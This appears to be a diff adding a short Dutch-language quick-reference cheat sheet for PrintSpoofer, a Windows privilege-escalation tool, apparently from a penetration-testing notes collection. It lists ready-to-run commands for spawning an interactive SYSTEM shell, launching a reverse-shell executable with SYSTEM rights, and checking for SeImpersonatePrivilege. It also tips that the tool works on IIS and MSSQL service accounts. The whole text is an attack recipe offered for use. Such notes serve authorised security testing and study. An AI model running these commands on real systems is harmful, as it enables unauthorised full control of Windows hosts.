@@ -1,1 +1,9 @@
-printerspoofer
+# PrintSpoofer - Snelle referentie
+# Zie 'printspoofer' voor download + uitgebreide uitleg
+# Interactieve SYSTEM shell:
+PrintSpoofer64.exe -i -c cmd
+# Reverse shell:
+PrintSpoofer64.exe -c "C:\Windows\tasks\shell.exe"
+# Check of SeImpersonatePrivilege beschikbaar is:
+whoami /priv | findstr Impersonate
+# Tip: Werkt op service accounts (IIS, MSSQL, etc.)
